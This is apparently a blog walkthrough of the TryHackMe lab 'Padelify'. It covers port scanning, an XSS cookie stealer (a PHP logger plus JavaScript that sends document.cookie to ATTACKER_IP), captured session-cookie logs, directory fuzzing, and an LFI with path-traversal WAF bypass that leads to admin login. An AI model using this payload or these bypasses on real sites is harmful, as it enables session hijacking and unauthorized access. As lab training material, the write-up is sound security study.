---
title: "Padelify: WAF Bypass"
date: 2025-11-28 00:00:00 +0800
categories: [Web Exploitation]
tags: [xss-cookie, WAF Bypass]
platform: Web
author: 0xmr
image: /assets/img/posts/xss.jpg
excerpt: "Walkthrough"
---

# Padelify TryHackMe

## Scanning

### Using Custom Script
```bash
└─# python3 Fast_Port.py -H 10.48.175.116
[+] Scan Results For: 10.48.175.116
 [+] 22/tcp open
 [+] 80/tcp open
```

### Using Rustscan
```bash
rustscan -a ip -- -A
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

## Registration Page

![Login Page](/assets/img/posts/login_page.png)

After registration, a moderator will review your request.

## XSS Cookie Stealer

### Create PHP Handler

Create `0xmr.php`:

```php
<?php
file_put_contents("cookies.txt", $_GET['c'] . "\n", FILE_APPEND);
?>
```

### Create JavaScript Payload

Create `0xmr.js`:

```javascript
var img = new Image();
img.src = "http://ATTACKER_IP/0xmr.php?c=" + document.cookie;
```

## Cookie Stealing Payload

```html
<script src="http://ATTACKER_IP/0xmr.js"></script>
```

### Start HTTP Server and Capture Cookies

```bash
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.49.131.222 - - [01/Dec/2025 15:51:52] "GET /0xmr.js HTTP/1.1" 200 -
10.49.131.222 - - [01/Dec/2025 15:51:52] "GET /0xmr.php?c=PHPSESSID=6sc7sfcpau8h29s7tp5pc13j1l HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```

## Login as Moderator

![Moderator Page](/assets/img/posts/moderatorpng.png)

## Directory Fuzzing

### Using Dirsearch

```bash
dirsearch -u http://BOX_IP/ -r -x 400,403
Target: http://10.48.175.116/
[15:08:13] Starting: 
[15:08:16] 301 -  311B  - /js  ->  http://10.48.175.116/js/                 
[15:08:36] 301 -  315B  - /config  ->  http://10.48.175.116/config/         
[15:08:36] 200 -  453B  - /config/                                          
[15:08:38] 301 -  312B  - /css  ->  http://10.48.175.116/css/               
[15:08:38] 302 -    0B  - /dashboard.php  ->  login.php                     
[15:08:42] 200 -   33B  - /footer.php                                       
[15:08:44] 200 -  728B  - /header.php                                       
[15:08:47] 301 -  319B  - /javascript  ->  http://10.48.175.116/javascript/ 
[15:08:47] 200 -  463B  - /js/                                              
[15:08:49] 200 -  467B  - /login.php                                        
[15:08:49] 302 -    0B  - /logout.php  ->  index.php                        
[15:08:50] 301 -  313B  - /logs  ->  http://10.48.175.116/logs/             
[15:08:50] 200 -  457B  - /logs/                                            
[15:08:50] 200 -    1KB - /logs/error.log
[15:09:00] 302 -    0B  - /register.php  ->  index.php                      
[15:09:05] 200 -    1KB - /status.php  
```

## Analyzing `/logs/error.log`

Upon checking this directory, we discover the config file path: `/var/www/html/config/app.conf`

## Local File Inclusion (LFI)

After logging in as moderator, we access the `live.php` page. Capturing the request and modifying the file path to `config/app.conf` initially returns a `403 Forbidden` response.

![Live Page](/assets/img/posts/live-page.png)

### WAF Bypass Techniques

1. **URL encoding** - Encode the path
2. **Path traversal** - Use `../config/app.conf` with dot notation
3. **Default paths** - Try nginx default credential paths

![Credentials Page](/assets/img/posts/credential.png)

## Login as Admin

Successfully logged in as admin using the discovered password: `bxxxxxxo44`

![Admin Page](/assets/img/posts/admin-page.png)

---

### Key Findings

- **Vulnerable Parameters**: XSS in registration form, LFI in live.php
- **WAF Bypass**: URL encoding and path traversal techniques
- **Credentials Obtained**: Admin access via exposed configuration file
